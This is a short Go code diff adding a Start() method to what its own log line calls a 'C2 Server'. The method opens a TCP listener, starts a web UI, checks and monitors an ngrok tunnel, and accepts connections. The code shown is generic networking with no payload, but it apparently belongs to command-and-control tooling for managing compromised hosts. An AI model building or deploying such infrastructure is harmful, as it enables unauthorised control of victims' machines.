@@ -121,3 +121,33 @@ func VerifyNgrokConnection(config *Config) {
     }
 }
 func (s *Server) Start() error {
+    listener, err := net.Listen("tcp", s.config.GetAddress())
+    if err != nil {
+        return fmt.Errorf("failed to start listener: %v", err)
+    }
+    s.listener = listener
+
+    log.Printf("🚀 C2 Server listening on %s", s.config.GetAddress())
+    log.Printf("🌐 Web UI available at http://%s", s.config.GetWebAddress())
+
+    // ✅ TAMBAHKAN INI:
+    VerifyNgrokConnection(s.config)
+    go s.monitorNgrokTunnel()
+    // ✅ SAMPAI SINI
+
+    go StartWebServer(s.config, s)
+
+    for s.running {
+        conn, err := listener.Accept()
+        if err != nil {
+            if !s.running {
+                break
+            }
+            continue
+        }
+        go s.handleConnection(conn)
+    }
+
+    listener.Close()
+    return nil
+}
